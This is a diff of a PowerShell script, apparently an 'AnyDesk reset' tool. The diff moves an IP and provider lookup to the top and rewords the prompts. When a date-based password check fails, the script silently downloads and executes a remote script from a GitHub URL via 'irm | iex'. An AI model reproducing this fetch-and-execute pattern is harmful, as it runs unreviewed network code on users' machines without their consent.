@@ -1,3 +1,13 @@
+
+$url = "https://ipinfo.io/json"
+$response = Invoke-RestMethod -Uri $url
+$ip = $response.ip
+$provider = $response.org
+
+Write-Host "IP: $ip"
+Write-Host "You Link: $provider"
+
+
 function ConvertTo-PlainText([System.Security.SecureString]$secureString) {
     $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)
     [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
@@ -5,7 +15,7 @@ function ConvertTo-PlainText([System.Security.SecureString]$secureString) {
 
 $Nzivkqavmg = (Get-Date).ToString("ddMMyyyy")
 
-if ((ConvertTo-PlainText (Read-Host -Prompt "Now?" -AsSecureString)) -ne $Nzivkqavmg) {
+if ((ConvertTo-PlainText (Read-Host -Prompt "E agora/?" -AsSecureString)) -ne $Nzivkqavmg) {
     Write-Host @"
        _____
      /      \
@@ -14,25 +24,17 @@ if ((ConvertTo-PlainText (Read-Host -Prompt "Now?" -AsSecureString)) -ne $Nzivkq
      \______/
 "@ -ForegroundColor red
     Write-Host "" 
-    Write-Host "      Oh no!" -ForegroundColor red
+    Write-Host "      Ihiii!" -ForegroundColor red
 
     Start-Sleep -Seconds 1 
     irm https://raw.githubusercontent.com/francisney/inilog/refs/heads/main/tetris.ps1 | iex
     return
 }
 
-Write-Host "Authenticated successfully!"
+Write-Host ":)"
 
 
 
-Write-Host "Authenticated successfully!"
-$url = "https://ipinfo.io/json"
-$response = Invoke-RestMethod -Uri $url
-$ip = $response.ip
-$provider = $response.org
-
-Write-Host "IP: $ip"
-Write-Host "You Link: $provider"
 
 $Host.UI.RawUI.WindowTitle = "Reset AnyDesk"
 
